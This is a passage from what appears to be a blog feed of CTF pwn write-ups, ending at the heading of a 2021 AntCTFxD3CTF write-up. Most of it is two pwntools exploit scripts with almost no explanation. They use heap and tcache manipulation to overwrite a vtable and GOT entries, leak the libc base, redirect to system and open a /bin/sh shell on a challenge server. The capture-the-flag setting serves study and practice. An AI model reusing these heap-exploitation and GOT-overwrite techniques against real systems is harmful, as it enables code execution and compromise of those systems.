class="string">&quot;-&gt;&quot;</span>)</span><br><span class="line">            <span class="built_in">map</span> = p.recv(<span class="number">0x40</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">map</span>) - <span class="number">2</span>):</span><br><span class="line">                key = <span class="number">0x20</span> + <span class="number">0x10</span> * i</span><br><span class="line">                value = u8(<span class="built_in">map</span>[i:i + <span class="number">1</span>])</span><br><span class="line">                old_value = tcache_map.get(key)</span><br><span class="line">                <span class="keyword">if</span> value &gt; old_value <span class="keyword">and</span> key &gt; <span class="number">0x30</span>:</span><br><span class="line">                    size_change_count += <span class="number">1</span></span><br><span class="line">                    class_size_list.append(key)</span><br><span class="line">                    tcache_map.update(&#123;key: value&#125;)</span><br><span class="line">                    log.success(<span class="string">&quot;detected class &#123;&#125; size is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">hex</span>(key)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">map</span> = p.recv(<span class="number">0x40</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">map</span>) - <span class="number">2</span>):</span><br><span class="line">                key = <span class="number">0x20</span> + <span class="number">0x10</span> * i</span><br><span class="line">                value = u8(<span class="built_in">map</span>[i:i + <span class="number">1</span>])</span><br><span class="line">                old_value = tcache_map.get(key)</span><br><span class="line">                <span class="keyword">if</span> value &gt; old_value <span class="keyword">and</span> key &gt; <span class="number">0x30</span>:</span><br><span class="line">                    size_change_count += <span class="number">1</span></span><br><span class="line">                    class_size_list.append(key)</span><br><span class="line">                    tcache_map.update(&#123;key: value&#125;)</span><br><span class="line">                    log.success(<span class="string">&quot;detected class &#123;&#125; size is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">hex</span>(key)))</span><br><span class="line">            <span class="comment"># print(tcache_map)</span></span><br><span class="line">        <span class="keyword">if</span> size_change_count &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error size change count too much&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> class_size_list:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        create(i, <span class="built_in">chr</span>(<span class="number">0x61</span> + i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    get_size_list(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(size_list)</span><br><span class="line"></span><br><span class="line">get_class_size_init()</span><br><span class="line">get_class_size()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class_index = <span class="number">0</span></span><br><span class="line">vec_index = <span class="number">0</span></span><br><span class="line">control_inex = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(size_list):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">4</span> * value <span class="keyword">in</span> class_size_list:</span><br><span class="line">        vec_index = index</span><br><span class="line">        class_index = class_size_list.index(<span class="number">4</span> * value)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    total_value = class_size_list[i] + size_list[i]</span><br><span class="line">    <span class="keyword">if</span> total_value &lt; size_list[vec_index] * <span class="number">7</span>:</span><br><span class="line">        control_inex = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;class index is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(class_index))</span><br><span class="line">log.success(<span class="string">&quot;vec index is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(vec_index))</span><br><span class="line">log.success(<span class="string">&quot;control index is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(control_inex))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b Delete\nb View\nb Set\nb Get\nb Create\nb Clone&#x27;</span>)</span><br><span class="line"><span class="comment"># leak_name = &quot;a&quot;*(0x20000 - 0x7000)</span></span><br><span class="line"><span class="comment"># create(0, leak_name)</span></span><br><span class="line"><span class="comment"># clone(leak_name)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># delete(leak_name)</span></span><br><span class="line"><span class="comment"># show()</span></span><br><span class="line"><span class="comment"># #</span></span><br><span class="line"><span class="comment"># # p.recvuntil(gen_name(9, 0))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># p.recv(0x40)</span></span><br><span class="line"><span class="comment"># heap_address = u64(p.recv(8))</span></span><br><span class="line"><span class="comment"># log.success(&quot;heap address is &#123;&#125;&quot;.format(hex(heap_address)))</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     p.recvuntil(b&quot;\xa0&quot;)</span></span><br><span class="line"><span class="comment">#     log.success(&quot;recevied a0 one&quot;)</span></span><br><span class="line"><span class="comment">#     data = p.recv(5)</span></span><br><span class="line"><span class="comment">#     if b&quot;\x7f&quot; in data:</span></span><br><span class="line"><span class="comment">#         libc.address = u64((b&quot;\xa0&quot; + data).ljust(8, b&quot;\x00&quot;)) - 96 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment">#         log.success(&quot;libc address is &#123;&#125;&quot;.format(hex(libc.address)))</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, gen_name(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">0</span>, <span class="string">&quot;/bin/shaaaaaaaaa\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># size_list = [496, 496, 476, 28, 40, 940, 94, 168, 624, 916]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># class 6 vec size is 0x5e, 0x5e*4 = 0x178</span></span><br><span class="line"><span class="comment"># class 6 size is 0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># class 3 size is 0x178</span></span><br><span class="line"><span class="comment"># class 3 vec is 0x1c * 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># class 7 size is 0x70</span></span><br><span class="line"><span class="comment"># class 7 vec size is 0xa8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">6</span>, gen_name(<span class="number">6</span>, i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">3</span>, gen_name(<span class="number">3</span>, i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(gen_name(<span class="number">3</span>, i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(<span class="number">6</span>, gen_name(<span class="number">6</span>, <span class="number">7</span> + i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(gen_name(<span class="number">6</span>, i))</span><br><span class="line"></span><br><span class="line">clone(gen_name(<span class="number">6</span>, <span class="number">2</span> + <span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(gen_name(<span class="number">6</span>, <span class="number">7</span> + i))</span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>, gen_name(<span class="number">7</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x760</span> - <span class="number">0x6e0</span></span><br><span class="line">new_name = p64(<span class="number">0x00000000004029bc</span>)</span><br><span class="line"><span class="comment"># if debug:</span></span><br><span class="line"><span class="comment">#     context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment">#     gdb.attach(p, &#x27;b Delete\nb View\nb Set\nb Get\nb Create\nb Clone&#x27;)</span></span><br><span class="line"><span class="comment"># get(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"></span><br><span class="line">write_value(gen_name(<span class="number">7</span>, <span class="number">0</span>), offset, get_vtable(<span class="number">6</span>) + <span class="number">0x10</span>)</span><br><span class="line">write_value(gen_name(<span class="number">7</span>, <span class="number">0</span>), offset + <span class="number">0x8</span>, elf.got[<span class="string">&#x27;setvbuf&#x27;</span>])</span><br><span class="line">write_value(gen_name(<span class="number">7</span>, <span class="number">0</span>), offset + <span class="number">0x10</span>, <span class="number">8</span>)</span><br><span class="line">write_value(gen_name(<span class="number">7</span>, <span class="number">0</span>), offset + <span class="number">0x78</span>, elf.got[<span class="string">&#x27;memcmp&#x27;</span>])</span><br><span class="line">write_value(gen_name(<span class="number">7</span>, <span class="number">0</span>), offset + <span class="number">0x78</span> + <span class="number">0x8</span>, elf.got[<span class="string">&#x27;memcmp&#x27;</span>] + <span class="number">0x40</span>)</span><br><span class="line">write_value(gen_name(<span class="number">7</span>, <span class="number">0</span>), offset + <span class="number">0x78</span> + <span class="number">0x10</span>, elf.got[<span class="string">&#x27;memcmp&#x27;</span>] + <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(gen_name(<span class="number">6</span>, <span class="number">14</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;-&gt;&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;-&gt;&#x27;</span>, drop=<span class="literal">True</span>)) - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"><span class="comment"># if debug:</span></span><br><span class="line"><span class="comment">#     context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment">#     gdb.attach(p, &#x27;b Delete\nb View\nb Set\nb Get\nb Create\nb Clone&#x27;)</span></span><br><span class="line"><span class="built_in">set</span>(p64(libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]), <span class="number">0</span>, <span class="built_in">str</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>] &amp; <span class="number">0xffffffff</span>))</span><br><span class="line"><span class="comment"># write_value(new_name, 0x0, libc.sym[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">get(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="xxrw-exp"><a href="#xxrw-exp" class="headerlink" title="xxrw exp"></a>xxrw exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, string, re</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;t&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;local&#x27;</span>:</span><br><span class="line">    p = process(elf_path)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;remote&#x27;</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.17.0.6&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">type_list = []</span><br><span class="line">vec_size_list = []</span><br><span class="line">struct_size_list = []</span><br><span class="line">vec_offset_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bin</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;==\n&#x27;</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">&#x27;\n===&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    os.system(<span class="string">&quot;echo %s | base64 -d &gt; ./pwn.xz&quot;</span> % data)</span><br><span class="line">    os.system(<span class="string">&quot;rm ./pwn&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;xz -d ./pwn.xz&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;chmod 777 ./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_type_list</span>():</span><br><span class="line">    types = elf.read(elf.get_section_by_name(<span class="string">&#x27;.rodata&#x27;</span>).header.sh_addr + <span class="number">0xB8</span>, <span class="number">70</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">70</span>, <span class="number">7</span>):</span><br><span class="line">        type_list.append(types[i:i + <span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_vec_size_list</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;type? &#x27;</span>)</span><br><span class="line">    p.sendline(type_list[idx])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    size = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    vec_size_list.append(<span class="built_in">int</span>(size))</span><br><span class="line">    p.sendline(<span class="built_in">chr</span>(<span class="number">0x61</span> + idx) * <span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">chr</span>(<span class="number">0x61</span> + idx) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_struct_size_list</span>():</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        func_name = <span class="string">&#x27;_ZN11CreatorImplI6&#123;&#125;E6createEv&#x27;</span>.<span class="built_in">format</span>(type_list[idx])</span><br><span class="line">        struct_size_list.append(u32(elf.read(elf.functions[func_name].address + <span class="number">0x10</span>, <span class="number">4</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_vec_offset_list</span>():</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        func_name = <span class="string">&#x27;_ZN6&#123;&#125;C2Ev&#x27;</span>.<span class="built_in">format</span>(type_list[idx])</span><br><span class="line">        <span class="keyword">if</span> elf.read(elf.functions[func_name].address + <span class="number">0x2C</span>, <span class="number">1</span>) == <span class="string">&#x27;\x05&#x27;</span>:</span><br><span class="line">            vec_offset_list.append(u32(elf.read(elf.functions[func_name].address + <span class="number">0x2D</span>, <span class="number">4</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            vec_offset_list.append(u8(elf.read(elf.functions[func_name].address + <span class="number">0x2E</span>, <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_vtable_offset</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">return</span> elf.get_section_by_name(<span class="string">&#x27;.data.rel.ro&#x27;</span>).header.sh_addr + <span class="number">0x48</span> + <span class="number">0x38</span> * (<span class="number">9</span> - idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;type? &#x27;</span>)</span><br><span class="line">    p.sendline(type_list[idx])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clone</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">name, offset, value</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;off val\n&quot;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendline(value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_value</span>(<span class="params">name, offset, value</span>):</span><br><span class="line">    index = <span class="built_in">int</span>(offset / <span class="number">4</span>)</span><br><span class="line">    <span class="built_in">set</span>(name, index, <span class="built_in">str</span>(value &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">    <span class="built_in">set</span>(name, index + <span class="number">1</span>, <span class="built_in">str</span>(value &gt;&gt; <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================================================================</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;remote&#x27;</span>:</span><br><span class="line">    get_bin()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">get_type_list()</span><br><span class="line"><span class="built_in">print</span>(type_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    get_vec_size_list(i)</span><br><span class="line"><span class="built_in">print</span>(vec_size_list)</span><br><span class="line"></span><br><span class="line">get_struct_size_list()</span><br><span class="line"><span class="built_in">print</span>(struct_size_list)</span><br><span class="line"></span><br><span class="line">get_vec_offset_list()</span><br><span class="line"><span class="built_in">print</span>(vec_offset_list)</span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line">global_i = <span class="number">0</span></span><br><span class="line">global_j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> vec_size_list[i] * <span class="number">4</span> == struct_size_list[j]:</span><br><span class="line">            key = <span class="number">1</span></span><br><span class="line">            global_i = i</span><br><span class="line">            global_j = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">create(global_j, <span class="string">&#x27;lyyltql&#x27;</span>)</span><br><span class="line">create(global_j, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">clone(<span class="string">&#x27;lyyltql&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;lyyltql&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">create(global_i, <span class="string">&#x27;xxrwtcl&#x27;</span>)</span><br><span class="line">write_value(<span class="string">&#x27;xxrwtcl&#x27;</span>, <span class="number">0</span>, get_vtable_offset(global_j))</span><br><span class="line">write_value(<span class="string">&#x27;xxrwtcl&#x27;</span>, <span class="number">0x8</span>, elf.got[<span class="string">&#x27;setvbuf&#x27;</span>])</span><br><span class="line">write_value(<span class="string">&#x27;xxrwtcl&#x27;</span>, <span class="number">0x10</span>, <span class="number">0x8</span>)</span><br><span class="line">write_value(<span class="string">&#x27;xxrwtcl&#x27;</span>, vec_offset_list[global_j], elf.got[<span class="string">&#x27;memcmp&#x27;</span>])</span><br><span class="line">write_value(<span class="string">&#x27;xxrwtcl&#x27;</span>, vec_offset_list[global_j] + <span class="number">0x8</span>, elf.got[<span class="string">&#x27;memcmp&#x27;</span>] + <span class="number">0x8</span>)</span><br><span class="line">write_value(<span class="string">&#x27;xxrwtcl&#x27;</span>, vec_offset_list[global_j] + <span class="number">0x10</span>, elf.got[<span class="string">&#x27;memcmp&#x27;</span>] + <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;-&gt;&#x27;</span>)</span><br><span class="line">libcbase = u64(p.recvn(<span class="number">8</span>)) - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libcbase = &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(p64(libcbase + libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]), <span class="number">0</span>, <span class="built_in">str</span>((libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]) &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">get(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021 AntCTFxD3CTF PWN WriteUp</title>
      <link href="/posts/3469048985.html"/>
      <url>/posts/3469048985.html</url>
      
